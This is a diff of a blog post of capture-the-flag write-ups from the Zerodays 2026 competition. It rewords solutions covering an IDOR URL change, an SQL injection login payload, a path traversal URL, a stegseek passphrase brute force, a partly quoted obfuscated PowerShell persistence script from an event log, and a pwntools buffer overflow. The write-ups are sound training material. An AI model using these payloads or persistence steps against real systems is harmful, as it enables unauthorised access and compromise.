@@ -8,19 +8,19 @@ image:
   alt: Zerodays CTF 2026 — Tuff Pigeon challenge
 ---
 
-Zerodays is The Irish Colleges Cyber-Security Challenge, held annually at Croke Park in Dublin. Teams of four compete across web, forensics, crypto, pwn, stegano, and network challenges. This year's edition ran on March 22, 2026.
+Zerodays is The Irish Colleges Cyber-Security Challenge, held every year at Croke Park in Dublin. Teams of four compete across web, forensics, crypto, pwn, stegano, and network categories. This year's edition ran on March 22, 2026.
 
-I competed as **en2eavor**. Below are writeups for the challenges I solved.
+I played as **en2eavor**.
 
 ---
 
 ## Tuff Pigeon — WarmUp
 
-A three-part web challenge. Each step gives one token fragment; the final flag is the concatenation.
+Three web steps, each giving one token fragment. Concatenate them for the flag.
 
 <img src="/assets/images/zerodays-ctf/tuffpigeon-challenge.png" alt="Tuff Pigeon challenge overview" style="border-radius: 10px; width: 100%;" />
 
-**Step 1 — IDOR.** The URL passes `?user=guest`. Swap it to `admin`:
+**Step 1 — IDOR.** The URL passes `?user=guest`. Change it to `admin`:
 
 ```
 https://tuffpigeon.zerodays.events/step1.php?user=admin
@@ -28,11 +28,11 @@ https://tuffpigeon.zerodays.events/step1.php?user=admin
 
 `token1 = id0r!`
 
-**Step 2 — SQL injection.** Enter `u' OR 1=1;#` in the username field. The query short-circuits authentication and returns the second token.
+**Step 2 — SQL injection.** Enter `u' OR 1=1;#` in the username field. The query short-circuits and returns the second token.
 
 `token2 = th4nks`
 
-**Step 3 — Path traversal.** The goal is to read `/opt/challenge/step3_token.txt`. Chain `../` until you escape the web root:
+**Step 3 — Path traversal.** Need to read `/opt/challenge/step3_token.txt`. Chain enough `../` to escape the web root:
 
 ```
 https://tuffpigeon.zerodays.events/step3.php?file=../../../../../../../../opt/challenge/step3_token.txt
@@ -48,7 +48,7 @@ Submit all three parts:
 
 ## They dont know — Stegano
 
-Given a JPG. Steganography in a JPEG — `steghide` is the obvious first move, but brute-forcing with `stegseek` against `rockyou` is faster:
+JPG file, so `steghide` is the natural first guess. I used `stegseek` with `rockyou` — it's faster and handles empty passphrases automatically:
 
 ```shell
 ➜ stegseek chall.jpg
@@ -62,20 +62,20 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 ZeroDays{st3gh1de_f0r-hid1ng_flagz!}
 ```
 
-The passphrase is empty. `stegseek` catches that immediately.
+Empty passphrase. `stegseek` found it in seconds.
 
 ---
 
 ## One Does Not Simply — Stegano
 
-Given a PNG. `zsteg` on PNG files, always:
+PNG file, so `zsteg` first:
 
 ```shell
 ➜ zsteg challenge.png
 meta mxfile   .. text: "%3Cmxfile%20host%3D%22app.diagrams.net%22..."
 ```
 
-The output is long and URL-encoded. I decoded it in CyberChef. After URL-decoding I got a code block containing a long Base64 string. Decoding the Base64 produces an image with the flag on it.
+The output is URL-encoded and long. I dropped it into CyberChef to decode. After URL-decoding, there's a code block with a long Base64 string inside. Decode it and you get an image with the flag on it.
 
 ```
 https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&oeol=VT
@@ -85,11 +85,11 @@ https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,fal
 
 ## Shark Attack — WarmUp
 
-Given a PCAP. Open it in Wireshark and follow the stream. The user downloads a file called `baby.gif` over FTP.
+PCAP file. Open in Wireshark, follow the stream — the traffic shows someone downloading a file called `baby.gif` over FTP.
 
 <img src="/assets/images/zerodays-ctf/sharkattack-pcap-stream.png" alt="Following the FTP stream in Wireshark" style="border-radius: 10px; width: 100%;" />
 
-Export it: **File → Export Objects → FTP-DATA**.
+Export it via **File → Export Objects → FTP-DATA**:
 
 <img src="/assets/images/zerodays-ctf/sharkattack-export-ftpdata.png" alt="Exporting FTP data objects" style="border-radius: 10px; width: 100%;" />
 
@@ -99,18 +99,18 @@ The flag is printed on the image.
 
 ## Nyan Logger — Forensics
 
-Given a Windows Event Viewer file (`.evtx`). Open it on Windows and filter for PowerShell event ID **4104** (ScriptBlock logging).
+Windows Event Viewer file (`.evtx`). Open it on Windows and filter for PowerShell event ID **4104** (ScriptBlock logging).
 
-The logged script is obfuscated — it creates a hidden directory, disables Windows Defender real-time monitoring, creates a local user, adds them to a privileged group, and registers a scheduled task at logon. Each string is encoded as an XOR-encrypted byte array.
+The logged script is a full persistence payload: creates a hidden directory, kills real-time monitoring in Defender, registers a new local user, drops them into a privileged group, and sets up a scheduled task at logon. Every string is XOR-obfuscated.
 
-The password block is what matters for the flag:
+The password variable is what leads to the flag:
 
 ```powershell
 $pass = ConvertTo-SecureString $($k5517=192;$b=[byte[]](0x96,0xf2,0xf1,0x97,...);
     -join($b|%{[char]($_-bxor$k5517)})) -AsPlainText -Force
 ```
 
-The key is `192`. Each byte XOR'd with 192 gives the plaintext — which turns out to be a Base64 string:
+Key is `192`. XOR each byte with it:
 
 ```python
 k = 192
@@ -135,9 +135,9 @@ ZeroDays{Ev3Nt_L0gg1ng_101_67}
 
 ## Trolling — Misc
 
-The file is named `.png` but it is not a valid PNG. Opening it in a hex editor shows it starts with the ASCII string `"get trolled"`, followed by some garbage bytes, then valid JPEG data from offset `0x14` onward.
+The file is named `.png` but it is not valid PNG. A hex editor shows it starts with the ASCII string `"get trolled"`, some garbage bytes, then actual JPEG data starting at offset `0x14`.
 
-Fix the header:
+Strip the fake header and write a clean JPEG:
 
 ```python
 data = open('chall.png', 'rb').read()
@@ -147,13 +147,13 @@ open('fixed.jpg', 'wb').write(jpeg_data)
 
 <img src="/assets/images/zerodays-ctf/trolling-fixed.png" alt="Repaired JPEG with the flag" style="border-radius: 10px; width: 100%;" />
 
-The flag is on the image.
+Flag's on the image.
 
 ---
 
 ## Pwn Training — Pwn
 
-The binary uses `signal(SIGSEGV, crash_win)`. Normally a segfault kills the process; here it redirects to `crash_win()`, which prints the flag. So the goal is just to trigger a segfault.
+`signal(SIGSEGV, crash_win)` is set at the top of `main`. A segfault normally kills the process — here it calls `crash_win()`, which prints the flag. So all we need is a crash.
 
 ```c
 int overflow()
@@ -172,7 +172,7 @@ int overflow()
 }
 ```
 
-`strchr(s, 65)` scans for `'A'` (ASCII 65) and exits if found, so you can't fill with `A`. Fill with `B` instead. `gets()` has no length check, so overflowing past the 208-byte buffer and the saved RBP is enough:
+`strchr(s, 65)` exits if it finds `'A'` (ASCII 65) in the input. So don't use `A`. Fill with `B` instead — `gets()` has no length check, so blowing past the 208-byte buffer plus saved RBP is enough to segfault:
 
 ```python
 from pwn import *
@@ -199,15 +199,15 @@ ZeroDays{c0ngratz_y0u_ar3_n0t_a_pwN_sK1d}
 
 ## ProGlovver — Network
 
-Given a PCAP. Following UDP and TCP streams turns up a DNS TXT record with a flag-looking string — it does not work. Troll flag.
+PCAP file. Following UDP and TCP streams turns up a DNS TXT record with something that looks like a flag. It doesn't work — troll flag.
 
 <img src="/assets/images/zerodays-ctf/proglovver-dns-troll.png" alt="DNS TXT troll flag" style="border-radius: 10px; width: 100%;" />
 
-Digging deeper shows suspicious traffic on port 1337:
+Dig further and you find suspicious traffic on port 1337:
 
 <img src="/assets/images/zerodays-ctf/proglovver-port1337.png" alt="Suspicious packets on port 1337" style="border-radius: 10px; width: 100%;" />
 
-Inspecting each stream:
+Go through each stream:
 
 <img src="/assets/images/zerodays-ctf/proglovver-stream1.png" alt="Stream 1" style="border-radius: 10px; width: 100%;" />
 
@@ -215,7 +215,7 @@ Inspecting each stream:
 
 <img src="/assets/images/zerodays-ctf/proglovver-stream3.png" alt="Stream 3" style="border-radius: 10px; width: 100%;" />
 
-Reconstructing the fragments manually gives the real flag:
+Piece the fragments together manually:
 
 `ZeroDays{T_C_P_0v3rl4p_1s_3v1l}`
 
@@ -225,7 +225,7 @@ Reconstructing the fragments manually gives the real flag:
 
 Two files: `challenge.png` and `hint.png`.
 
-`hint.png` contains exactly 16 colors — matching the number of hex digits. Each pixel in `challenge.png` maps to one of those 16 colors, and each color encodes one nibble (0–F).
+`hint.png` has exactly 16 colors, which matches the number of hex digits. Each pixel in `challenge.png` is one of those 16 colors, and each color maps to one nibble (0–F):
 
 | Nibble | Color | RGB |
 |--------|-------|-----|
@@ -246,7 +246,7 @@ Two files: `challenge.png` and `hint.png`.
 | E | light-yellow | (255, 255, 128) |
 | F | white | (255, 255, 255) |
 
-Reading pixels left-to-right, top-to-bottom, pairs of nibbles form bytes. Decode with:
+Read pixels left-to-right, top-to-bottom. Every pair of nibbles is one byte. Script:
 
 ```python
 #!/usr/bin/env python3
@@ -270,7 +270,7 @@ hex_str = "".join(f"{n:x}" for n in nibbles)
 print(hex_str)
 ```
 
-Run the hex output through CyberChef (From Hex → decode):
+Drop the hex string into CyberChef (From Hex):
 
 <img src="/assets/images/zerodays-ctf/schizosteg-cyberchef.png" alt="CyberChef hex decode" style="border-radius: 10px; width: 100%;" />
 
